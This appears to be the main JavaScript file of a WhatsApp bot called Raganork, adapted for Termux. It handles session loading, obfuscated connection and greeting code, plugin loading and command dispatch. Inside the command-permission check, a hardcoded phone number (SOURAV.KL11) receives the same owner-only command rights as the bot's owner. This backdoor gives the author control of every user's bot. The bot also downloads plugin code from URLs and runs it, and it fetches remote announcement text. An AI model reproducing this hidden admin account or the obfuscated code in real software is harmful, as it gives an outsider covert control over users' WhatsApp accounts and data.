/* Copyright Yusuf Usta.
Re-modified and renovated for termux by souravkl11
*/
const code = 'YOUR RAGANORK CODE HERE!'
const fs = require("fs");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const Config = require('./config');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./Raganork/');
const { DataTypes } = require('sequelize');
const { getMessage } = require("./modules/raganork/greetings");
const simpleGit = require('simple-git');
const git = simpleGit();
const axios = require('axios');
const got = require('got');

const Language = require('./language');
const Lang = Language.getString('updater');

// raganork
const DATABASE = config.DATABASE.define('Raganork', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});

fs.readdirSync('./modules/raganork/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./modules/raganork/' + plugin);
    }
});

const plugindb = require('./modules/raganork/plugin');
var SOURAV = { KL11: '916282344739,0' }

// Code source. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
   });
};
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function Raganork () {
    await config.DATABASE.sync();
    var StrSes_Db = await DATABASE.findAll({
        where: {
          info: 'StringSession'
        }
    });
    // Web connection!
    var i=b;(function(c,d){var h=b,e=c();while(!![]){try{var f=-parseInt(h('0x1ce'))/0x1*(parseInt(h('0x1c1'))/0x2)+parseInt(h('0x1be'))/0x3+parseInt(h('0x1c6'))/0x4*(-parseInt(h('0x1c2'))/0x5)+parseInt(h('0x1c4'))/0x6+-parseInt(h('0x1c0'))/0x7+parseInt(h('0x1cf'))/0x8*(-parseInt(h('0x1c8'))/0x9)+parseInt(h('0x1cb'))/0xa*(parseInt(h('0x1cc'))/0xb);if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0x60daa));var sk=new Array();function a(){var j=['loadAuthInfo','1779849ZSnCmf','version','5349890NCrCib','1005314AhudrH','371660AWQWYK','floor','300384UufGuc','value','40HVCDTx','logger','113229rCLwoY','debug','length','657850eRWPBy','297witIhx','DEBUG','1RMWbGl','8tRGCqn','deCrypt','dataValues','level'];a=function(){return j;};return a();}sk[0x0]='E'+'d'+'g'+'e',sk[0x1]='Fi'+'r'+'e'+'f'+'o'+'x',sk[0x2]='S'+'a'+'f'+'a'+'r'+'i',sk[0x3]='O'+'p'+'e'+'r'+'a';var l11=Math[i('0x1c3')](0x4*Math['random']());const conn=new WAConnection();conn[i('0x1bf')]=[0x2,0x85c,0xc],conn['browserDescription']=['R'+'a'+'g'+'a'+'n'+'o'+'r'+'k',sk[l11],'90'];const Session=new StringSession();conn[i('0x1c7')][i('0x1d2')]=config[i('0x1cd')]?i('0x1c9'):'warn';var nodb;function b(c,d){var e=a();return b=function(f,g){f=f-0x1be;var h=e[f];return h;},b(c,d);}StrSes_Db[i('0x1ca')]<0x1?(nodb=!![],conn[i('0x1d3')](Session[i('0x1d0')](code))):conn[i('0x1d3')](Session[i('0x1d0')](StrSes_Db[0x0][i('0x1d1')][i('0x1c5')]));
    conn.on ('credentials-updated', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login information updated!')
        );

        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await DATABASE.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    

    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('Raga')}${chalk.blue.bold('nork Termux')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}

${chalk.blue.italic('ℹ️ Configuring connection to WhatsApp...')}`);
    });
    

    conn.on('open', async () => {
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./modules/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./modules/' + plugin.dataValues.name + '.js', response.body);
                    require('./modules/' + plugin.dataValues.name + '.js');
                }     
            }
        });

        fs.readdirSync('./modules').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./modules/' + plugin);
            }
        });

        console.log(
            chalk.green.bold('BOT CONNECTED!')
        );
        await new Promise(r => setTimeout(r, 1100));
        await conn.sendMessage(conn.user.jid, '*RAGANORK STARTED ON TERMINAL!*', MessageType.text);
    });
    
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
         
        while (getGMTh == 16 && getGMTm == 30) {
            const {data} = await axios(`https://gist.github.com/souravkl11/019112af334adceaefd1467dcbd93e58/raw`)
            const { sken, skml } = data
            
            return await conn.sendMessage(conn.user.jid, '```[ ANNOUNCEMENT ]```\n\n' + sken, MessageType.text);
        }
        
    }, 50000);

    conn.on('chat-update', async m => {
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;

        if (config.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
     // Welcome mention try by souravkl11
        function b(c,d){var e=a();return b=function(f,g){f=f-0x7a;var h=e[f];return h;},b(c,d);}function a(){var l=['{gphead}','sendMessage','remoteJid','{gpmaker}','{owner}','remotejid','WEL_GIF','message','name','key','messageStubType','video','includes','desc','subject','split','replace','4584860LgNJQz','18HAOAkO','groupMetadata','49xEVUmz','{pp}','{gif}','messageStubParameters','getProfilePicture','39726yPcaiy','gif','{mention}','then','486348UXgFpU','data','247210gmujpt','2714650imzWAl','{gicon}','86NuJSmD','owner','{gpdesc}','c.us','text','user','from','s.whatsapp.net','arraybuffer','276736XnJyWS','1426648LXYkGI','get','GIF_BYE'];a=function(){return l;};return a();}var i=b;(function(c,d){var h=b,e=c();while(!![]){try{var f=parseInt(h('0x96'))/0x1+parseInt(h('0x99'))/0x2*(parseInt(h('0x90'))/0x3)+parseInt(h('0xa3'))/0x4+-parseInt(h('0x97'))/0x5+-parseInt(h('0x94'))/0x6*(-parseInt(h('0x8b'))/0x7)+parseInt(h('0xa2'))/0x8+-parseInt(h('0x89'))/0x9*(parseInt(h('0x88'))/0xa);if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0x4cfee));if(msg[i('0x81')]===0x20||msg[i('0x81')]===0x1c){var gb=await getMessage(msg[i('0x80')][i('0xa8')],'goodbye');if(gb!==![]){if(gb['message'][i('0x83')]('{pp}')){let pp;try{pp=await conn['getProfilePicture'](msg[i('0x8e')][0x0]);}catch{pp=await conn[i('0x8f')]();}var pinkjson=await conn[i('0x8a')](msg[i('0x80')]['remoteJid']);await axios[i('0xa4')](pp,{'responseType':i('0xa1')})[i('0x93')](async c=>{var j=i;await conn[j('0xa7')](msg[j('0x80')]['remoteJid'],c[j('0x95')],MessageType['image'],{'caption':gb[j('0x7e')][j('0x87')](j('0x8c'),'')['replace'](j('0x92'),'@'+msg[j('0x8e')][0x0][j('0x86')]('@')[0x0])['replace']('{gphead}',pinkjson[j('0x85')])[j('0x87')](j('0x7a'),pinkjson['owner'])['replace'](j('0x9b'),pinkjson['desc'])[j('0x87')]('{owner}',conn['user'][j('0x7f')])},{'contextInfo':{'mentionedJid':[msg[j('0x8e')][0x0]['replace'](j('0x9c'),'s.whatsapp.net')]},'previewType':0x0});});}else{if(gb[i('0x7e')][i('0x83')]('{gicon}')){var sgroup=await conn[i('0x8f')](msg[i('0x80')][i('0x7c')]);await conn[i('0xa7')](msg['key'][i('0xa8')],Buffer['from'](sgroup['data']),MessageType[i('0x82')],{'mimetype':Mimetype['gif'],'caption':gb[i('0x7e')][i('0x87')](i('0x98'),'')[i('0x87')]('{gphead}',pinkjson[i('0x85')])[i('0x87')](i('0x7a'),pinkjson[i('0x9a')])[i('0x87')](i('0x9b'),pinkjson[i('0x84')])[i('0x87')](i('0x7b'),conn[i('0x9e')][i('0x7f')])},{'contextInfo':{'mentionedJid':[msg['messageStubParameters'][0x0][i('0x87')](i('0x9c'),i('0xa0'))]},'previewType':0x0});}else{if(gb[i('0x7e')][i('0x83')](i('0x8d'))){var pinkjson=await conn['groupMetadata'](msg[i('0x80')][i('0xa8')]),plkpinky=await axios[i('0xa4')](config[i('0xa5')],{'responseType':i('0xa1')});await conn[i('0xa7')](msg[i('0x80')]['remoteJid'],Buffer[i('0x9f')](plkpinky[i('0x95')]),MessageType['video'],{'mimetype':Mimetype[i('0x91')],'caption':gb[i('0x7e')][i('0x87')]('{gif}','')[i('0x87')](i('0x92'),'@'+msg[i('0x8e')][0x0][i('0x86')]('@')[0x0])[i('0x87')](i('0xa6'),pinkjson[i('0x85')])[i('0x87')]('{gpmaker}',pinkjson[i('0x9a')])['replace'](i('0x9b'),pinkjson['desc'])[i('0x87')](i('0x7b'),conn['user'][i('0x7f')])},{'contextInfo':{'mentionedJid':[msg[i('0x8e')][0x0][i('0x87')](i('0x9c'),i('0xa0'))]},'previewType':0x0});}else{var pinkjson=await conn[i('0x8a')](msg[i('0x80')][i('0xa8')]);await conn[i('0xa7')](msg[i('0x80')]['remoteJid'],gb[i('0x7e')][i('0x87')](i('0xa6'),pinkjson[i('0x85')])['replace'](i('0x92'),'@'+msg['messageStubParameters'][0x0][i('0x86')]('@')[0x0])[i('0x87')]('{gpdesc}',pinkjson['desc'])[i('0x87')](i('0x7b'),conn['user'][i('0x7f')]),MessageType[i('0x9d')],{'contextInfo':{'mentionedJid':[msg[i('0x8e')][0x0]['replace'](i('0x9c'),'s.whatsapp.net')]},'previewType':0x0});}}}}return;}else{if(msg['messageStubType']===0x1b||msg[i('0x81')]===0x1f){var gb=await getMessage(msg[i('0x80')][i('0xa8')]);if(gb!==![]){if(gb[i('0x7e')][i('0x83')](i('0x8c'))){let pp;try{pp=await conn[i('0x8f')](msg['messageStubParameters'][0x0]);}catch{pp=await conn['getProfilePicture']();}var pinkjson=await conn[i('0x8a')](msg[i('0x80')]['remoteJid']);await axios[i('0xa4')](pp,{'responseType':'arraybuffer'})[i('0x93')](async c=>{var k=i;await conn[k('0xa7')](msg['key']['remoteJid'],c['data'],MessageType['image'],{'caption':gb[k('0x7e')][k('0x87')]('{pp}','')['replace'](k('0x92'),'@'+msg[k('0x8e')][0x0]['split']('@')[0x0])[k('0x87')](k('0xa6'),pinkjson[k('0x85')])[k('0x87')](k('0x7a'),pinkjson['owner'])[k('0x87')](k('0x9b'),pinkjson[k('0x84')])[k('0x87')](k('0x7b'),conn[k('0x9e')]['name'])},{'contextInfo':{'mentionedJid':[msg['messageStubParameters'][0x0][k('0x87')]('c.us',k('0xa0'))]},'previewType':0x0});});}else{if(gb['message'][i('0x83')]('{gif}')){var plkpinky=await axios[i('0xa4')](config[i('0x7d')],{'responseType':i('0xa1')});await conn['sendMessage'](msg[i('0x80')][i('0xa8')],Buffer[i('0x9f')](plkpinky['data']),MessageType['video'],{'mimetype':Mimetype[i('0x91')],'caption':gb[i('0x7e')][i('0x87')](i('0x8d'),'')[i('0x87')](i('0xa6'),pinkjson[i('0x85')])[i('0x87')]('{mention}','@'+msg[i('0x8e')][0x0][i('0x86')]('@')[0x0])[i('0x87')](i('0x7a'),pinkjson[i('0x9a')])['replace'](i('0x9b'),pinkjson[i('0x84')])['replace']('{owner}',conn['user'][i('0x7f')])},{'contextInfo':{'mentionedJid':[msg[i('0x8e')][0x0]['replace'](i('0x9c'),i('0xa0'))]},'previewType':0x0});}else{if(gb[i('0x7e')]['includes'](i('0x98'))){var sgroup=await conn[i('0x8f')](msg[i('0x80')][i('0x7c')]);await conn[i('0xa7')](msg[i('0x80')]['remoteJid'],Buffer['from'](sgroup[i('0x95')]),MessageType[i('0x82')],{'mimetype':Mimetype[i('0x91')],'caption':gb[i('0x7e')][i('0x87')]('{gicon}','')['replace'](i('0xa6'),pinkjson[i('0x85')])['replace'](i('0x7a'),pinkjson[i('0x9a')])[i('0x87')](i('0x9b'),pinkjson['desc'])[i('0x87')](i('0x7b'),conn[i('0x9e')][i('0x7f')])},{'contextInfo':{'mentionedJid':[msg['messageStubParameters'][0x0][i('0x87')](i('0x9c'),i('0xa0'))]},'previewType':0x0});}else{var pinkjson=await conn[i('0x8a')](msg[i('0x80')]['remoteJid']);await conn[i('0xa7')](msg[i('0x80')]['remoteJid'],gb[i('0x7e')]['replace']('{gphead}',pinkjson[i('0x85')])['replace'](i('0x92'),'@'+msg[i('0x8e')][0x0][i('0x86')]('@')[0x0])[i('0x87')](i('0x9b'),pinkjson[i('0x84')])[i('0x87')](i('0x7b'),conn[i('0x9e')][i('0x7f')]),MessageType[i('0x9d')],{'contextInfo':{'mentionedJid':[msg[i('0x8e')][0x0][i('0x87')](i('0x9c'),i('0xa0'))]},'previewType':0x0});}}}}return;}}

    if (config.BLOCKCHAT !== false) {     
        var abc = config.BLOCKCHAT.split(',');                            
        if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    
    
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }

                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                   }  
                   if ((SOURAV.KL11 == "916282344739,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && SOURAV.KL11.includes(',') ? SOURAV.KL11.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == SOURAV.KL11 || SOURAV.KL11.includes(',') ? SOURAV.KL11.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == SOURAV.KL11)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
  
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                       
                        var match = text_msg.match(command.pattern);
                        
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }

                        try {
                            await command.function(whats, match);
                        } catch (error) {
                            await conn.sendMessage(conn.user.jid, error, MessageType.text);
                            }
                        }
                    }
                }
            
        )
    });

    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Something went wrong. Please restart'))
            conn.loadAuthInfo(Session.deCrypt(code)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

Raganork();
